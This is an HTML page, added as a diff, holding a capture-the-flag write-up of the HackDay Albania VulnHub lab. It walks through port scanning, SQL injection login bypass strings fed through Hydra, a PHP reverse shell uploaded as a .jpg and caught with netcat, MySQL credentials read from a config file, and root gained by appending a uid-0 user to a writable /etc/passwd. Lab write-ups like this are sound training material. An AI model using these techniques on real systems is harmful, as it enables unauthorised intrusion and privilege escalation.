@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>HackDay Albania CTF</title>
+
+	<!-- BootstrapCDN -- >
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	
+	<!-- Latest compiled and minified CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+
+	<!-- jQuery library -->
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+
+	<!-- Latest compiled JavaScript -->
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+	<!-- Google Fonts -->
+  	<link href="https://fonts.googleapis.com/css?family=Droid+Sans+Mono|Inconsolata" rel="stylesheet">
+
+  	<!-- style sheet -->
+	<link rel="stylesheet" type="text/css" href="/css/style.css">
+
+	<!--Google Analytics -->
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-52352656-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+
+	<!--Prism Theme-->
+	<link href="/themes/prism.css" rel="stylesheet" />
+</head>
+
+<body>
+<!-- Prism JS -->
+	<script src="/js/prism.js"></script>
+
+	<div class="jumbotron text-center">
+	  <h1>HackDay Albania</h1>
+	  <p>December 29th, 2016</p>
+	  <p>CTF Write-Up</p> 
+	</div>
+	  
+	<div class="container">
+	  <div class="row">
+	    <div class="col-sm-12">
+	    <a href="https://jessecbrown.com"><----Back to jessecbrown.com</a>
+	      <h3>Background</h3>
+	      <p>This write-up covers the HackDay Albania CTF on <a href="https://www.vulnhub.com/entry/hackday-albania,167/" target="_blank">Vulnhub.com</a> </p>
+
+	      <h3>Reconnaissance</h3>
+	      <p>In the reconnaissance stage of a PenTest it's best to not make too much noise. I like to use NetDiscover for some light reconnaissance:</p>
+	      <br>
+	      <!-- NetDiscover Code-->
+			<pre><code class="language-none">
+root@kali:~# netdiscover -r 192.168.56.0/24
+
+ Currently scanning: Finished!   |   Screen View: Unique Hosts                 
+                                                                               
+ 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180               
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.56.1    0a:00:27:00:00:00      1      60  Unknown vendor              
+ 192.168.56.100  08:00:27:a6:f4:60      1      60  Cadmus Computer Systems     
+ 192.168.56.103  08:00:27:98:0d:5f      1      60  Cadmus Computer Systems 
+			</code></pre>
+			<br>
+			<p>The only unknown MAC address on my host-only network has the IP address of 192.168.56.103
+				Now that we have identified our target let's make some noise with <code>NMAP</code>:</p>
+			<br>
+			<pre><code class="language-none">
+root@kali:~# nmap -sSVC -p- 192.168.56.103
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-12-23 14:40 EST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.56.103
+Host is up (0.00012s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 39:76:a2:f0:82:5f:1f:75:0d:e4:c4:c5:a7:48:b1:58 (RSA)
+|_  256 21:fe:63:45:2c:cb:a1:f1:b6:ba:36:dd:ed:d3:d9:48 (ECDSA)
+8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 26 disallowed entries (15 shown)
+| /rkfpuzrahngvat/ /slgqvasbiohwbu/ /tmhrwbtcjpixcv/ 
+| /vojtydvelrkzex/ /wpkuzewfmslafy/ /xqlvafxgntmbgz/ /yrmwbgyhouncha/ 
+| /zsnxchzipvodib/ /atoydiajqwpejc/ /bupzejbkrxqfkd/ /cvqafkclsyrgle/ 
+|_/unisxcudkqjydw/ /dwrbgldmtzshmf/ /exschmenuating/ /fytdinfovbujoh/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: HackDay Albania 2016
+MAC Address: 08:00:27:98:0D:5F (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
+			</code></pre>
+			<br>
+			<p>Interesting. So we have <code>SSH</code> on port 22 and an Apache Web Server running on port 8008. There is a robots.txt file disallowing a few directories. Lets take a look at what the web server is serving on port 8008:</p>
+			<br>
+			<img src="/images/HackDayAlbania/mrRobot.jpg" alt="Mr Robot Background">
+			<br>
+			<br>
+			<p>A quick trip to Google Translate and it appears this popup says: "If I am, I know where to go ;)" Perhaps this means Mr. Robot would know where to go? Maybe it's time to take a closer look at that robots.txt file…</p>
+			<pre><code class="language-none">
+root@kali:~# curl http://192.168.56.103:8008/robots.txt
+Disallow: /rkfpuzrahngvat/
+Disallow: /slgqvasbiohwbu/
+Disallow: /tmhrwbtcjpixcv/
+Disallow: /vojtydvelrkzex/
+Disallow: /wpkuzewfmslafy/
+Disallow: /xqlvafxgntmbgz/
+Disallow: /yrmwbgyhouncha/
+Disallow: /zsnxchzipvodib/
+Disallow: /atoydiajqwpejc/
+Disallow: /bupzejbkrxqfkd/
+Disallow: /cvqafkclsyrgle/
+Disallow: /unisxcudkqjydw/
+Disallow: /dwrbgldmtzshmf/
+Disallow: /exschmenuating/
+Disallow: /fytdinfovbujoh/
+Disallow: /gzuejogpwcvkpi/
+Disallow: /havfkphqxdwlqj/
+Disallow: /ibwglqiryexmrk/
+Disallow: /jcxhmrjszfynsl/
+Disallow: /kdyinsktagzotm/
+Disallow: /lezjotlubhapun/
+Disallow: /mfakpumvcibqvo/
+Disallow: /ngblqvnwdjcrwp/
+Disallow: /ohcmrwoxekdsxq/
+Disallow: /pidnsxpyfletyr/
+Disallow: /qjeotyqzgmfuzs/
+</code></pre>
+			<br>
+			<p><code>DIRB</code> didn't return anything interesting. I think it's time to take a look at some of the pages in the robots.txt
+			All but one of the pages had the below raptor meme. The Albanian translates to "Is this the right directory? Or a Jerk?"</p>
+			<br>
+			<img src="/images/HackDayAlbania/raptor.jpg" alt="raptor meme">
+			<br>
+			<p>Looks like there is a "Very Secure Bank" app: http://192.168.56.103:8008/unisxcudkqjydw/vulnbank/client/login.php Somehow I don't beleieve this is going to be very secure... </p>
+			<br>
+			<img src="/images/HackDayAlbania/VerySecureBank.png" alt="very secure bank login">
+			<br>
+			<h3>Gaining Access</h3>
+			<br>
+			<p>After testing a few common username/password combinaitions and basic SQL injection I get the below error. It look like it's time to fire up SQLMAP and see if we can break in that way. SQLMAP is one of my favorite tools for testing for SQL injection vulnernabilities. However, it looks like SQLMAP won't be able to help out today.</p>
+			<br>
+			<img src="/images/HackDayAlbania/sqli.png" alt="SQL Error">
+			<br>
+			<p>I kept striking out with manual SQL injection. To speed up the process I took my list of common SQL injection commands and fed it into THC Hydra and BOOM, we are in:</p>
+			<br>
+<pre><code class="language-none">
+root@kali:~# hydra -L /root/Desktop/SQLAuthBypass.txt -P /root/Desktop/SQLAuthBypass.txt 192.168.56.103 http-post-form "/unisxcudkqjydw/vulnbank/client/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Credentials" -s 8008
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2017-01-02 16:37:58
+[DATA] max 16 tasks per 1 server, overall 64 tasks, 2209 login tries (l:47/p:47), ~2 tries per task
+[DATA] attacking service http-post-form on port 8008
+[8008][http-post-form] host: 192.168.56.103   login: admin' --   password: or 1=1#
+[8008][http-post-form] host: 192.168.56.103   login: admin' or '1'='1'--   password: or 1=1#
+[STATUS] 1422.00 tries/min, 1422 tries in 00:01h, 787 to do in 00:01h, 16 active
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2017-01-02 16:39:28
+</code></pre>
+			<br>
+			<p>It looks like there is a way for us to "contact support" and upload a file. However, it appears we can only upload .jpgs because the company has recently been hacked. It seems like the site is just checking to see if the uploaded file ends in a .jpg extension. Lets see what happens if I upload PenTest Monkey's PHP reverse shell with a .jpg extension. We will start NetCat listening with the below command:</p>
+			<br>
+			<pre><code class="language-none">
+root@kali:~# nc -v -n -l -p 1336
+listening on [any] 1336 ...
+connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 42114
+Linux hackday 4.4.0-53-generic #74-Ubuntu SMP Fri Dec 2 15:59:10 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+ 23:21:33 up  2:45,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$
+			</code></pre>
+			<br>
+			<p>And we're in! Looks like we have an Apache service account. Lets spawn a interactive shell using Python:</p>
+			<pre><code class="language-none">
+$ python3 -c 'import pty; pty.spawn("/bin/sh")'
+			</code></pre>
+			<br>
+			<p>Now it's time to get root. I tried a DirtyCow exploit but it appeared as if the vulnerability was already patched. In the config.php file there is a root password for the MySQL database.</p>
+			<br>
+<pre><code class="language-none">
+$db_host = "127.0.0.1";
+$db_name = "bank_database";
+$db_user = "root";
+$db_password = "NuCiGoGo321";
+</code></pre>	
+			<br>		
+			<p>Let's take look in the database and see if there is anything useful:</p>
+			<br>
+			<pre><code class="language-none">
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| bank_database      |
+| mysql              |
+| performance_schema |
+| sys                |
+| vulnbank           |
++--------------------+
+6 rows in set (0.00 sec)
+
+mysql> use bank_database;
+use bank_database;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++-------------------------+
+| Tables_in_bank_database |
++-------------------------+
+| klienti                 |
+| tickets                 |
++-------------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from klienti;
+select * from klienti;
++----+-------------+---------+---------+----------+------------+
+| ID | emer        | mbiemer | bilanci | username | password   |
++----+-------------+---------+---------+----------+------------+
+|  1 | Charles D.  | Hobson  | 1000000 | hobson   | Charles123 |
+|  2 | Jeffery     | Fischer |  120000 | jeff     | jeff321    |
++----+-------------+---------+---------+----------+------------+
+2 rows in set (0.00 sec)
+</code></pre>
+
+		<br>
+		<h3>Privilege Escalation</h3>
+		<br>
+		<p>Unfortuantely none of the database passwords, or the MySQL root password, can be used to elevate our access. At this point I got stuck for a while. I started looking through <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">g0tmi1k's Basic Linux Priviledge Escalation guide</a> and after a lot of seaching I found that the passwd file is writeable!</p>
+<pre><code class="language-none">
+$ find / -perm -0002 -type f -print -xdev 2>/dev/null
+find / -perm -0002 -type f -print -xdev 2>/dev/null
+/etc/passwd
+</code></pre>
+		<br>
+		<p>After reading up on the formatting of the Linux passwd file I executed the below command to change the password of taviso and login with a new password:</p>
+<pre><code class="language-none">
+echo 'jb:$6$ZSilPwLm63OxcZ$V.qx9BNPaxRf12DioUjy7.UjIOjPDJapGLxIiaSVssqytitJtmzs9DWYAOu5zWIdu/EqmpdLYPktW5XlRgFPG.:0:0:jb,,,:/home/taviso:/bin/bash' >> /etc/passwd
+
+$ su - jb
+su - jb
+Password: pwn
+
+dfoot@hackday:~#
+</code></pre>
+		<br>
+		<p>And the flag is sitting in the root directory:</p>
+		<br>
+<pre><code class="language-none">
+dfoot@hackday:/root# id
+id
+uid=0(dfoot) gid=0(root) groups=0(root)
+dfoot@hackday:/root# cat flag.txt
+cat flag.txt
+Urime, 
+Tani nis raportin!
+
+d5ed38fdbf28bc4e58be142cf5a17cf5
+</code></pre>	
+		<br>	
+	    </div>
+	  </div>
+	</div>
+	
+<footer style="width: 100%; text-align: center; padding-top: 25px; color: #98999E;">
+	<div class="col-md-16 text-center">
+		<a href="https://twitter.com/jessecarlbrown" class="twitter-follow-button" data-show-count="false">Follow @jessecarlbrown</a><script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+		<br>
+		<br>
+		<span>Jesse Brown © 2017<span>
+		</span></span></footer>
+		<br>
+		<br>
+
+	</div>
+</body>
+</html>
